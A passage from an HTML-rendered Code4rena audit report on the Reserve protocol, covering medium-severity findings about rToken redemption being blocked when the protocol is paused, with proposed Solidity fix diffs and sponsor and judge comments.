issues.</p>\n<h3 id=\"tools-used-11\" style=\"position:relative;\"><a href=\"#tools-used-11\" aria-label=\"tools used 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>When <code>StRSR.seizeRSR</code> is called, the <code>rsrRewardsAtLastPayout</code> variable should be set to the rewards that are available after the seizure:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">diff --git a/contracts/p1/StRSR.sol b/contracts/p1/StRSR.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">index 8fe1c3e7..4f9ea736 100644</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">--- a/contracts/p1/StRSR.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+++ b/contracts/p1/StRSR.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">@@ -419,6 +419,7 @@ abstract contract StRSRP1 is Initializable, ComponentP1, IStRSR, EIP712Upgradeab</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         // Transfer RSR to caller</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         emit ExchangeRateSet(initRate, exchangeRate());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         IERC20Upgradeable(address(rsr)).safeTransfer(_msgSender(), seizedRSR);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        rsrRewardsAtLastPayout = rsrRewards();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     }</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/64#issuecomment-1406912384\">pmckelvy1 (Reserve) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/64#issuecomment-1421619875\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>Addressed here: <a href=\"https://github.com/reserve-protocol/protocol/pull/584\">https://github.com/reserve-protocol/protocol/pull/584</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed with comments. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/65\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/4\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/45\">AkshaySrivastav</a>.</p>\n<hr>\n<h2 id=\"m-24-baskethandler-users-might-not-be-able-to-redeem-their-rtoken-when-protocol-is-paused-due-to-refreshbasket-function\" style=\"position:relative;\"><a href=\"#m-24-baskethandler-users-might-not-be-able-to-redeem-their-rtoken-when-protocol-is-paused-due-to-refreshbasket-function\" aria-label=\"m 24 baskethandler users might not be able to redeem their rtoken when protocol is paused due to refreshbasket function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/39\">[M-24] BasketHandler: Users might not be able to redeem their rToken when protocol is paused due to refreshBasket function</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/39\">HollaDieWaldfee</a></em></p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L448\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L448</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L183-L192\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L183-L192</a></p>\n<p>The Reserve protocol allows redemption of rToken even when the protocol is <code>paused</code>.</p>\n<p>The <code>docs/system-design.md</code> documentation describes the <code>paused</code> state as:</p>\n<blockquote>\n<p>all interactions disabled EXCEPT RToken.redeem + RToken.cancel + ERC20 functions + StRSR.stake</p>\n</blockquote>\n<p>Redemption of rToken should only ever be prohibited when the protocol is in the <code>frozen</code> state.</p>\n<p>You can see that the <code>RToken.redeem</code> function (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514</a>) has the <code>notFrozen</code> modifier so it can be called when the protocol is in the <code>paused</code> state.</p>\n<p>The issue is that this function relies on the <code>BasketHandler.status()</code> to not be <code>DISABLED</code> (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L448\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L448</a>).</p>\n<p>The <code>BasketHandler.refreshBasket</code> function (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L183-L192\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L183-L192</a>) however, which must be called to get the basket out of the <code>DISABLED</code> state, cannot be called by any user when the protocol is paused.</p>\n<p>When the protocol is paused it can only be called by the governance (OWNER) address.</p>\n<p>So in case the basket is <code>DISABLED</code> and the protocol is paused, it is the governance that must call <code>refreshBasket</code> to allow redemption of rToken.</p>\n<p>This is dangerous because redemption of rToken should not rely on governance to perform any actions such that users can get out of the protocol when there is something wrong with the governance technically or if the governance behaves badly.</p>\n<h3 id=\"proof-of-concept-22\" style=\"position:relative;\"><a href=\"#proof-of-concept-22\" aria-label=\"proof of concept 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <code>RToken.redeem</code> function has the <code>notFrozen</code> modifier so it can be called when the protocol is paused (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439</a>).</p>\n<p>The <code>BasketHandler.refreshBasket</code> function can only be called by the governance when the protocol is paused:</p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L186-L190\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L186-L190</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">main</span><span class=\"mtk1\">.</span><span class=\"mtk11\">hasRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">OWNER</span><span class=\"mtk1\">, </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">()) ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk11\">status</span><span class=\"mtk1\">() == </span><span class=\"mtk12\">CollateralStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">DISABLED</span><span class=\"mtk1\"> &amp;&amp; !</span><span class=\"mtk12\">main</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pausedOrFrozen</span><span class=\"mtk1\">()),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk8\">&quot;basket unrefreshable&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Therefore the situation exists where rToken redemption should be possible but it is blocked by the <code>BasketHandler.refreshBasket</code> function.</p>\n<h3 id=\"tools-used-12\" style=\"position:relative;\"><a href=\"#tools-used-12\" aria-label=\"tools used 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>BasketHandler.refreshBasket</code> function should be callable by anyone when the <code>status()</code> is <code>DISABLED</code> and the protocol is <code>paused</code>.</p>\n<p>So the above <code>require</code> statement can be changed like this:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">diff --git a/contracts/p1/BasketHandler.sol b/contracts/p1/BasketHandler.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">index f74155b1..963e29de 100644</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">--- a/contracts/p1/BasketHandler.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+++ b/contracts/p1/BasketHandler.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">@@ -185,7 +185,7 @@ contract BasketHandlerP1 is ComponentP1, IBasketHandler {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             main.hasRole(OWNER, _msgSender()) ||</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-                (status() == CollateralStatus.DISABLED &amp;&amp; !main.pausedOrFrozen()),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+                (status() == CollateralStatus.DISABLED &amp;&amp; !main.frozen()),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             &quot;basket unrefreshable&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         _switchBasket();</span></span></code></pre>\n<p>It was discussed with the sponsor that they might even allow rToken redemption when the basket is <code>DISABLED</code>.</p>\n<p>In other words only disallow it when the protocol is <code>frozen</code>.</p>\n<p>This however needs further consideration by the sponsor as it might negatively affect other aspects of the protocol that are beyond the scope of this report.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/39#issuecomment-1401973403\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I believe this to be a design choice. Will leave open to sponsor review and most likely downgrade to QA.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/39#issuecomment-1406917946\">pmckelvy1 (Reserve) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/39#issuecomment-1409516991\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden identified a state that was inconsistent with sponsors expectations since they acknowledged the issue, I believe this should be Medium as it does affect the availability of the protocol. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed\">tbrent (Reserve) mitigated</a>:</strong></p>\n<blockquote>\n<p>This PR enables redemption while the basket is DISABLED: <a href=\"https://github.com/reserve-protocol/protocol/pull/575\">reserve-protocol/protocol#575</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/66\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/3\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/46\">AkshaySrivastav</a>.</p>\n<hr>\n<h2 id=\"m-25-backingmanager-rtokens-might-not-be-redeemable-when-protocol-is-paused-due-to-missing-token-allowance\" style=\"position:relative;\"><a href=\"#m-25-backingmanager-rtokens-might-not-be-redeemable-when-protocol-is-paused-due-to-missing-token-allowance\" aria-label=\"m 25 backingmanager rtokens might not be redeemable when protocol is paused due to missing token allowance permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/16\">[M-25] BackingManager: rTokens might not be redeemable when protocol is paused due to missing token allowance</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/16\">HollaDieWaldfee</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/424\">unforgiven</a></em></p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L72-L77\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L72-L77</a></p>\n<p>The Reserve protocol allows redemption of rToken even when the protocol is <code>paused</code>.</p>\n<p>The <code>docs/system-design.md</code> documentation describes the <code>paused</code> state as:</p>\n<blockquote>\n<p>all interactions disabled EXCEPT RToken.redeem + RToken.cancel + ERC20 functions + StRSR.stake</p>\n</blockquote>\n<p>Redemption of rToken should only ever be prohibited when the protocol is in the <code>frozen</code> state.</p>\n<p>The issue is that the <code>RToken.redeem</code> function (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514</a>) relies on the <code>BackingManager.grantRTokenAllowance</code> function (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L72-L77\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L72-L77</a>) to be called before redemption.</p>\n<p>Also the only function that relies on <code>BackingManager.grantRTokenAllowance</code> to be called before is <code>RToken.redeem</code>.</p>\n<p>Therefore <code>BackingManager.grantRTokenAllowance</code> can be called at any time before a specific ERC20 needs first be transferred from the <code>BackingManager</code> for the purpose of redemption of rToken.</p>\n<p>The issue is that the <code>BackingManager.grantRTokenAllowance</code> function has the <code>notPausedOrFrozen</code> modifier. This means it cannot (in contrast to <code>RToken.redeem</code>) be called when the protocol is <code>paused</code>.</p>\n<p>Therefore if rToken is for the first time redeemed for a specific ERC20 in a <code>paused</code> protocol state, <code>BackingManager.grantRTokenAllowance</code> might not have been called before.</p>\n<p>This effectively disables redemption of rToken as long as the protocol is <code>paused</code> and is clearly against the usability / economic considerations to allow redemption in the <code>paused</code> state.</p>\n<h3 id=\"proof-of-concept-23\" style=\"position:relative;\"><a href=\"#proof-of-concept-23\" aria-label=\"proof of concept 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>For simplicity assume there is an rToken backed by a single ERC20 called AToken</p>\n<ol>\n<li>rToken is issued and AToken is transferred to the <code>BackingManager</code>.</li>\n<li>The protocol goes into the <code>paused</code> state before any redemptions have occurred. So the <code>BackingManager.grantRTokenAllowance</code> function might not have been called at this point.</li>\n<li>Now the protocol is <code>paused</code> which should allow redemption of rToken but it is not possible because the AToken allowance cannot be granted since the <code>BackingManager.grantRTokenAllowance</code> function cannot be called in the <code>paused</code> state.</li>\n</ol>\n<p>Another scenario is when the basket of a RToken is changed to include an ERC20 that was not included in the basket before. If the protocol now goes into the <code>paused</code> state without <code>BackingManager.grantRTokenAllowance</code> being called before, redemption is not possible.</p>\n<h3 id=\"tools-used-13\" style=\"position:relative;\"><a href=\"#tools-used-13\" aria-label=\"tools used 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>BackingManager.grantRTokenAllowance</code> function should use the <code>notFrozen</code> modifier instead of the <code>notPausedOrFrozen</code> modifier such that allowance can be granted in the <code>paused</code> state:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">diff --git a/contracts/p1/BackingManager.sol b/contracts/p1/BackingManager.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">index 431e0796..7dfa29e9 100644</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">--- a/contracts/p1/BackingManager.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+++ b/contracts/p1/BackingManager.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">@@ -69,7 +69,7 @@ contract BackingManagerP1 is TradingP1, IBackingManager {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     // checks: erc20 in assetRegistry</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     // action: set allowance on erc20 for rToken to UINT_MAX</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     // Using two safeApprove calls instead of safeIncreaseAllowance to support USDT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-    function grantRTokenAllowance(IERC20 erc20) external notPausedOrFrozen {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+    function grantRTokenAllowance(IERC20 erc20) external notFrozen {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         require(assetRegistry.isRegistered(erc20), &quot;erc20 unregistered&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         // == Interaction ==</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         IERC20Upgradeable(address(erc20)).safeApprove(address(main.rToken()), 0);</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/16#issuecomment-1402019974\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I think the warden does identify a possible state of the system that could be problematic, albeit highly unlikely to be realized. Leaving open for sponsor review. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/16#issuecomment-1404274024\">pmckelvy1 (Reserve) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/16#issuecomment-1421621092\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>Addressed here: <a href=\"https://github.com/reserve-protocol/protocol/pull/584\">https://github.com/reserve-protocol/protocol/pull/584</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/2\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/67\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/47\">AkshaySrivastav</a>.</p>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 41 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/420\">report highlighted below</a> by <strong>CodingNameKiki</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/490\">brgltd</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/489\">joestakey</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/477\">Udsen</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/471\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/466\">0xAgro</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/462\">yongskiws</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/458\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/456\">Breeje</a>, <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/450\">peanuts</a>, 